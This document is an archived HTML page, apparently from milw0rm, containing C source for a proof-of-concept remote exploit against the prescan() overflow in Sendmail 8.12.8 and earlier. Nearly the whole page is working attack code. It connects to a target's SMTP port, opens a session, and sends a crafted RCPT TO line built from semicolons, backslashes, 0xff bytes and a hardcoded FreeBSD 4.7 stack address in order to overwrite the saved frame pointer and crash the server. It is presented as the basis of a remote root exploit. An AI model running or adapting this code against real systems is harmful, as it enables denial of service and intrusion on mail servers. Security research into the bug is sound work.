<html><head><title>Sendmail <= 8.12.8 prescan() BSD Remote Root Exploit</title></head><pre>/*
 * Sendmail 8.12.8 prescan() PROOF OF CONCEPT exploit by bysin
 * 
 * This is to prove that the bug in sendmail 8.12.8 and below is vulnerable.
 * On sucessful POC exploitation the program should crash with the following:
 *
 * Program received signal SIGSEGV, Segmentation fault.
 * 0x5c5c5c5c in ?? ()
 *
 */

#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netdb.h&gt;
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;

int maxarch=1;
struct arch {
	char *os; // The OS
	int pos; // The position of ebp in the stack, with the last byte being 0x00
	int apos; // The amount of bytes after pvpbuf where ebp is located
	unsigned long addr; // The pointer to the addr buffer
} archs[] = {
	{&quot;FreeBSD 4.7-RELEASE&quot;,180,28,0xbfbfdad1},
};


/////////////////////////////////////////////////////////

#define BUFSIZE 50096

void header() {
	printf(&quot;Sendmail 8.12.8 prescan() exploit by bysin\n\n&quot;);
}

void printtargets() {
	unsigned long i;
	header();
	printf(&quot;\t  Target\t Addr\t\t OS\n&quot;);
	printf(&quot;\t-------------------------------------------\n&quot;);
	for (i=0;i&lt;maxarch;i++) printf(&quot;\t* %d\t\t 0x%08x\t %s\n&quot;,i,archs[i].addr,archs[i].os);
	printf(&quot;\n&quot;);
}

void printresponse(char *a) {
	printf(&quot;%s\n&quot;,a);
}

void writesocket(int sock, char *buf) {
	if (send(sock,buf,strlen(buf),0) &lt;= 0) {
		printf(&quot;Error writing to socket\n&quot;);
		exit(0);
	}
	printresponse(buf);
}

void readsocket(int sock, int response) {
	char temp[BUFSIZE];
	memset(temp,0,sizeof(temp));
	if (recv(sock,temp,sizeof(temp),0) &lt;= 0) {
		printf(&quot;Error reading from socket\n&quot;);
		exit(0);
	}
	if (response != atol(temp)) {
		printf(&quot;Bad response: %s\n&quot;,temp);
		exit(0);
	}
	else printresponse(temp);
}

void relay(int sock) {
	while(1) {
		char temp[BUFSIZE];
		memset(temp,0,sizeof(temp));
		if (recv(sock,temp,sizeof(temp),0) &lt;= 0) {
			printf(&quot;Server vulnerable (crashed)\n&quot;);
			exit(0);
		}
		printresponse(temp);
		if (atol(temp) == 553) {
			printf(&quot;Not exploitable\n&quot;);
			exit(0);
		}
	}
}

int main(int argc, char **argv) {
	struct sockaddr_in server;
	unsigned long ipaddr,i,j,m;
	int sock,target;
	char tmp[BUFSIZE],buf[BUFSIZE],*p,*pos=NULL;
	if (argc &lt;= 2) {
		printf(&quot;%s &lt;target ip&gt; &lt;target number&gt;\n&quot;,argv[0]);
		printtargets();
		return 0;
	}
	target=atol(argv[2]);
	if (target &lt; 0 || target &gt;= maxarch) {
		printtargets();
		return 0;
	}

	header();

	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		printf(&quot;Unable to create socket\n&quot;);
		exit(0);
	}
	server.sin_family = AF_INET;
	server.sin_port = htons(25);
	printf(&quot;Resolving address... &quot;);
	fflush(stdout);
	if ((ipaddr = inet_addr(argv[1])) == -1) {
		struct hostent *hostm;
		if ((hostm=gethostbyname(argv[1])) == NULL) {
			printf(&quot;Unable to resolve address\n&quot;);
			exit(0);
		}
		memcpy((char*)&amp;server.sin_addr, hostm-&gt;h_addr, hostm-&gt;h_length);
	}
	else server.sin_addr.s_addr = ipaddr;
	memset(&amp;(server.sin_zero), 0, 8);
	printf(&quot;Address found\n&quot;);
	printf(&quot;Connecting... &quot;);
	fflush(stdout);
	if (connect(sock,(struct sockaddr *)&amp;server, sizeof(server)) != 0) {
		printf(&quot;Unable to connect\n&quot;);
		exit(0);
	}
	printf(&quot;Connected\n&quot;);
	printf(&quot;Sending exploit... \n&quot;);
	fflush(stdout);

	readsocket(sock,220);

	writesocket(sock,&quot;HELO yahoo.com\r\n&quot;);
	readsocket(sock,250);

	writesocket(sock,&quot;MAIL FROM: &lt;a@yahoo.com&gt;\r\n&quot;);
	readsocket(sock,250);

	memset(buf,0,sizeof(buf));
	strcpy(buf,&quot;RCPT TO: &quot;);
	p=buf+strlen(buf);
	for (i=1,j=0,m=0;i&lt;1242;i++) {
		if (!(i%256)) {
			*p++=';';
			j++;
		}
		else {
			if (j &lt; 4) *p++='A';
			else {
				if (m == archs[target].pos) pos=p;
				//if (m &gt; archs[target].pos) *p++='B'; else
				*p++='A';
				m++;
			}
		}
	}
	if (pos) memcpy(pos,(char*)&amp;archs[target].addr,4);
	*p++=';';
	for (i=0;i&lt;archs[target].apos;i++) {
		*p++='\\';
		*p++=0xff;
	}
	strcat(buf,&quot;\r\n&quot;);
	writesocket(sock,buf);

	relay(sock);
}


// milw0rm.com [2003-04-30]</pre></html>